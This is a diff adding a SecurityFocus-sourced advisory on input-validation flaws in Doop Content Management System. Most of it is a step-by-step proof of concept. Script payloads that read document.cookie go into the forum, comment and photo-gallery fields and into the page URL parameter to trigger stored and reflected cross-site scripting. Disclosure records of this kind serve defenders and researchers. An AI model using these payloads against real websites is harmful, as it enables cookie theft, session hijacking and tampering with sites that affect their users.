@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/23482/info
+
+Doop Content Management System is prone to multiple input-validation vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, execute arbitrary script code in the context of the webserver process, control how the site is rendered to the user, compromise the application, obtain sensitive information, and access or modify data. 
+
+Attack 1 :
+
+http://www.example.com/path/index.php?page=forum
+
+New/Reply Topic :
+
+Title: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Text: <script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Name or nick: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+e-mail: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+
+send.
+and refresh page ..
+
+Attack 2 :
+
+http://www.example.com/path/?page=vdasCMS
+
+New Comment: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Name: <script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Email: 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+Text: <script>alert(document.cookie);</script><script>alert(/xss/);</script>
+
+send.
+and refresh page ..
+
+Attack 3 :
+
+in photogallery page
+
+http://www.example.com/path/index.php?page=photos
+
+http://www.example.com/path/index.php?page=[XSS] example : 
+<script>alert(document.cookie);</script><script>alert(/xss/);</script>
+
